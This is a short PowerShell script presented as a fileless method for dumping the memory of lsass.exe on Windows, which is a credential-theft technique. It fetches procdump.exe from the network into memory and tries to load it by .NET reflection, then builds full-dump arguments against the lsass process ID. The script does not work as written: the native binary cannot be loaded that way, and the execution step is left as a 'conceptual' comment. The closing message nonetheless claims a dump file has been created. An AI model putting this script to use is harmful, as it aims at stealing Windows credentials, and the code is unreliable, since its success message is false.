# PowerShell Script to Filelessly Dump Memory of lsass.exe

# URL to procdump.exe
$procdumpUrl = "https://live.sysinternals.com/procdump.exe"

# Output directory for the dump file
$outputDir = "C:\Path\To\Output"

# Ensure the output directory exists
if (-not (Test-Path -Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir
}

# Download procdump into memory
$procDumpBytes = (Invoke-WebRequest -Uri $procdumpUrl -UseBasicParsing).Content

# Load procdump into memory (requires reflection)
$assembly = [System.Reflection.Assembly]::Load($procDumpBytes)

# Get the process ID of lsass.exe
$lsassPid = (Get-Process lsass).Id

# Define parameters for dumping memory
$parameters = "-ma $lsassPid $outputDir\lsass.dmp"

# Execute procdump from memory (this part is tricky and may not work in all environments)
# You might need to find a way to execute the assembly with arguments, which is not straightforward

# Note: This part of the script is conceptual. Executing a binary loaded into memory like this is complex and
# may require advanced techniques that go beyond typical PowerShell scripting.

Write-Host "Memory dump of lsass.exe should be created at $outputDir\lsass.dmp"
